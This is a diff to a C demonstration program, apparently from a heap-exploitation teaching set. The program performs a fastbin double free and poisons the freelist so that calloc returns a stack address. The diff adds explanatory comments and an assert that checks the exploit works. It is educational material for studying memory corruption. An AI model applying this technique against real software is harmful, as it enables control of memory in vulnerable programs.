@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <assert.h>
 
 int main()
 {
@@ -7,7 +8,7 @@ int main()
 	       "returning a pointer to a controlled location (in this case, the stack).\n");
 
 
-	printf("Fill up tcache first.\n");
+	fprintf(stderr,"Fill up tcache first.\n");
 
 	void *ptrs[7];
 
@@ -32,14 +33,15 @@ int main()
 	fprintf(stderr, "2nd calloc(1,8): %p\n", b);
 	fprintf(stderr, "3rd calloc(1,8): %p\n", c);
 
-	fprintf(stderr, "Freeing the first one...\n");
+	fprintf(stderr, "Freeing the first one...\n"); //First call to free will add a reference to the fastbin
 	free(a);
 
 	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
-	// free(a);
 
 	fprintf(stderr, "So, instead, we'll free %p.\n", b);
 	free(b);
+
+	//Calling free(a) twice renders the program vulnerable to Double Free
 
 	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
 	free(a);
@@ -61,5 +63,9 @@ int main()
 	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
 
 	fprintf(stderr, "3rd calloc(1,8): %p, putting the stack address on the free list\n", calloc(1,8));
-	fprintf(stderr, "4th calloc(1,8): %p\n", calloc(1,8));
+
+	void *p = calloc(1,8);
+
+	fprintf(stderr, "4th calloc(1,8): %p\n", p);
+	assert(p == 8+(char *)&stack_var);
 }
